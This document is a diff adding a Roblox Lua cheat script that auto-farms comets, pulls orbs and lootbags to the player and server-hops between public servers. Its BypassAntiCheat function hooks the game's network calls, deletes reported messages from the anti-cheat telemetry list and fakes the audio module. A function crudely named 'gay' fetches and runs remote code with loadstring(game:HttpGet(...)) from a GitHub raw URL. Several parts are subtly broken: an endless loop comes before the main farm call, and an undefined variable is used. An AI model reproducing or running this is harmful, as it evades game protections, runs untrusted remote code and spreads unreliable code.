@@ -1,0 +1,235 @@
+
+repeat task.wait() until game:IsLoaded()
+local Filename = "LDQHUB.json"
+local json
+function CreateSettings()
+	local HttpService = game:GetService("HttpService")
+	if (isfolder) and (makefolder) then
+		makefolder("LDQ")
+	end
+	if (writefile) then
+		json = HttpService:JSONEncode(main.Config)
+		writefile(Filename, json)   
+	end
+end
+	
+
+
+function ReadSettings(index)
+	local HttpService = game:GetService("HttpService")
+	local value
+	if (readfile and isfile) and isfile(Filename) then
+		local settingsTable = json
+		settingsTable = HttpService:JSONDecode(readfile(Filename))
+		for i, v in pairs(settingsTable) do
+			if i == index then
+				value = v
+			end
+		end
+		return value
+	end
+end
+
+local TeleportService = game:GetService("TeleportService")
+
+
+getgenv().AutoFarmComets = true
+
+local SelectedEnchants = {}
+local teleport = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport)
+function BypassAntiCheat()
+	local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+	local functions = Network.Fire, Network.Invoke
+	local old 
+	old = hookfunction(getupvalue(functions, 1) , function(...) return true end)
+	
+	local Blunder = require(game:GetService("ReplicatedStorage"):FindFirstChild("BlunderList", true))
+	local OldGet = Blunder.getAndClear
+
+	setreadonly(Blunder, false)
+
+	local function OutputData(Message)
+		return Message
+	end
+
+	Blunder.getAndClear = function(...)
+		local Packet = ...
+		for i,v in next, Packet.list do
+			if v.message ~= "PING" then
+				OutputData(v.message)
+				table.remove(Packet.list, i)
+			end
+		end
+		return OldGet(Packet)
+	end
+	local Audio = require(game:GetService("ReplicatedStorage").Library.Audio)
+	local old1 = hookfunction(Audio.Play, function(sound, ...)
+		return {
+			Play = function()
+				print("Fake sound played")
+			end,
+			Stop = function()
+				print("Fake sound stopped")
+			end,
+			IsPlaying = function()
+				return false
+			end
+		}
+	end)
+end
+
+BypassAntiCheat()
+local lib = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
+function JoinCoin(Coinid, PetTable)
+	if Coinid ~= nil and PetTable ~= nil then
+		lib.Network.Invoke("Join Coin", Coinid, PetTable)
+	end
+end
+
+function FarmCoin(Coinid, PetTable)
+	if Coinid ~= nil and PetTable ~= nil then
+		for i, v in pairs(PetTable) do
+			lib.Network.Fire("Farm Coin", Coinid, v)
+		end
+	end
+end
+
+function GetPetsTable()
+	local PetsEquipped = {}
+	for i, v in pairs(lib.PetCmds.GetEquipped()) do
+		table.insert(PetsEquipped, v.uid)
+	end
+	return PetsEquipped
+end
+
+local HttpService = game:GetService("HttpService")
+local Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
+local TeleportService = game:GetService("TeleportService")
+
+function ServerHop()
+wait(0.2)
+while wait(0.2) do
+	local Servers = {}
+	for i, v in pairs(Site.data) do
+		if v.playing and v.playing ~= v.maxPlayers then
+			local ping = nil
+			if typeof(v.ping) == "number" then
+				ping = v.ping
+			elseif typeof(v.ping) == "table" and typeof(v.ping.total) == "number" then
+				ping = v.ping.total
+			end
+			if ping ~= nil then
+				table.insert(Servers, {ping = ping, server = v})
+			end
+		end
+	end
+	table.sort(Servers, function(a, b)
+		return a.ping < b.ping
+	end)
+	local jobid 
+	local playerplaying
+	local Filename = "LDQHUB2.json"
+	for i, v in ipairs(Servers) do
+		jobid = v.server.id
+		playerplaying = v.server.playing
+		if isfile(Filename) and jobid ~= HttpService:JSONEncode(Filename) then
+			local server = v.server
+			jobid = v.server.id
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, jobid, LocalPlayer)
+			break
+		end
+	end
+	if (writefile) then
+		json = HttpService:JSONEncode(jobid)
+		writefile(Filename, json)   
+	end
+end
+end
+
+while task.wait() do
+for i,v in pairs(game:GetService("Workspace")["__THINGS"].Orbs:GetChildren()) do
+    v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+end
+for i,v in pairs(game:GetService("Workspace")["__THINGS"].Lootbags:GetChildren()) do
+    v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+end
+end
+
+function cometfarm()
+	local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+	local WorldCmds = require(game:GetService("ReplicatedStorage").Library.Client.WorldCmds)
+	local Variables = require(game:GetService("ReplicatedStorage").Library.Variables)
+	local function CheckForCometsScript()
+		if game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Comets then 
+			return true
+		else
+			return false
+		end
+	end
+	repeat task.wait() until CheckForCometsScript()
+	local function FindComet()
+		for i, v in pairs(Network.Invoke("Comets: Get Data")) do
+			if v then
+				return v
+			else
+				return nil
+			end
+		end
+	end
+	task.wait(0.1)
+	while task.wait(0.1) do
+		local table1 = game:GetService("Workspace")["__THINGS"].Lootbags:GetChildren()
+		local Coinid
+		local CometType
+		local Area
+		if getgenv().AutoFarmComets or ReadSettings("Auto Farm Comets") then
+			if FindComet() ~= nil then
+				local Info = FindComet()
+				if Info ~= nil then
+					Coinid = Info.CoinId
+					CometType = Info.Type
+					Area = Info.AreaId
+				else
+					ServerHop()
+				end
+				if WorldCmds.HasLoaded() and WorldCmds.Get() ~= Info.WorldId then
+					WorldCmds.Load(Info.WorldId)
+					print("Changing World To "..Info.WorldId)
+				end
+				if WorldCmds.HasLoaded() and #table1 == 0 then
+					Variables.Teleporting = false
+					teleport.Teleport(Area, true)
+					Variables.Teleporting = false
+					print("Teleported To "..CometType)
+					repeat task.wait(0.1) until Network.Invoke("Get Coins")[Coinid]
+					if Network.Invoke("Get Coins")[Coinid] then
+						JoinCoin(Coinid, GetPetsTable())
+						FarmCoin(Coinid, GetPetsTable())
+					end
+					repeat task.wait(0.1) until not Network.Invoke("Get Coins")[Coinid]
+				    print("Success Break Comet😇")
+					wait(10)
+					print("Serverhopping")
+					ServerHop()
+                end
+			else
+				if #table1 == 0 then
+					print("Not Found Comet😭")
+					ServerHop()
+					else
+					gay()
+					cometfarm()
+                    ServerHop()
+			  end
+		  end
+	   end
+    end
+end
+
+function gay()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Godteli/Test/main/Collect%20sus"))()
+end
+
+cometfarm()
+local lib = require(game:GetService("ReplicatedStorage").Framework.Library)
+
